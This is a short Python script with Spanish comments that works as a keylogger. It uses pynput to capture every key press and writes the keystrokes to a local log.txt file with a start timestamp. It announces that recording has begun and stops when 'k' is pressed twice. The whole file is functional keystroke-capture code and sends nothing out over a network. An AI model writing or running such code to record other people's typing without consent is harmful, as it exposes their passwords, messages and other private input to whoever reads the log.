from pynput.keyboard import  Listener
import os
from datetime import datetime

# Obtener la ubicación del directorio del script actual
directorio_actual = os.path.dirname(__file__)

# Nombre del archivo en el directorio actual
nombre_archivo = os.path.join(directorio_actual, "log.txt")



# Verificar si el archivo existe, y si no, crearlo
if not os.path.isfile(nombre_archivo):
    with open(nombre_archivo, "w") as archivo:
        archivo.write("Archivo de registro de teclas\n")


# Variable global para indicar si se debe detener la grabación
should_stop_recording = False

# Contador para rastrear la cantidad de veces que se presionó la tecla 'k'
contador_k = 0

# Función para guardar las teclas en un archivo
def guardar_tecla(tecla):
    global contador_k  # Declarar la variable como global

    if hasattr(tecla, 'name'):
        tecla_str = tecla.name
    else:
        tecla_str = str(tecla)

    with open(nombre_archivo, "a") as archivo:
        tecla_str = tecla_str.replace("'", "")
        if tecla_str == "enter":
          archivo.write("\n")  
        elif tecla_str == "space":
          archivo.write(" ") 
        elif tecla_str == "backspace":

            archivo.seek(0, 2)  # Coloca el puntero al final del archivo
            archivo.truncate(archivo.tell() - 1)  # Elimina el último carácter del archivo
        else :
            archivo.write(tecla_str)


        if tecla_str == "k":
            contador_k += 1

            if contador_k == 2:
                global should_stop_recording
                archivo.seek(0, 2)  # Coloca el puntero al final del archivo
                archivo.truncate(archivo.tell() - 2)  # Elimina el último carácter del archivo
                should_stop_recording = True
        else:
            contador_k = 0

# Obtener la fecha y hora actual
fecha_hora_actual = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
with open(nombre_archivo, "a") as archivo:
    archivo.write(f"\n\nInicio del programa: {fecha_hora_actual}\n")

# Crear un objeto Listener
with Listener(on_press=guardar_tecla) as listener:
    # Iniciar la grabación
    print("Iniciando la grabación. Presiona 'k' dos veces para detener.")
    
    try:
        while not should_stop_recording:
            pass

    except KeyboardInterrupt:
        pass
